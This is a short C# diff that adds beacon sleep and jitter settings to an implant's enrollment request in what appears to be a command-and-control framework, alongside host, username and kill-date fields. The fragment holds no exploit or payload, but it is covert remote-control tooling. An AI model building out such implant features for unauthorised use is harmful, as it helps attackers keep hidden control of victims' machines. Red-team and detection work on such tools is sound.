@@ -65,6 +65,17 @@ internal sealed class EnrollRequest
     [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
     public string? Username { get; set; }
 
+    // The baked contact cadence the implant runs, in seconds: the base sleep
+    // and the jitter half-width. Omitted when the dial carried none, the same
+    // not-supplied shape every optional field here keeps.
+    [JsonPropertyName("sleepSeconds")]
+    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+    public double? SleepSeconds { get; set; }
+
+    [JsonPropertyName("jitterSeconds")]
+    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+    public double? JitterSeconds { get; set; }
+
     [JsonPropertyName("killDate")]
     [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
     public string? KillDate { get; set; }
@@ -180,6 +191,8 @@ internal static class C2
             Os = dial.Host?.Os,
             Arch = dial.Host?.Arch,
             Username = dial.Host?.Username,
+            SleepSeconds = dial.SleepSeconds,
+            JitterSeconds = dial.JitterSeconds,
             KillDate = dial.KillDate,
         };
 
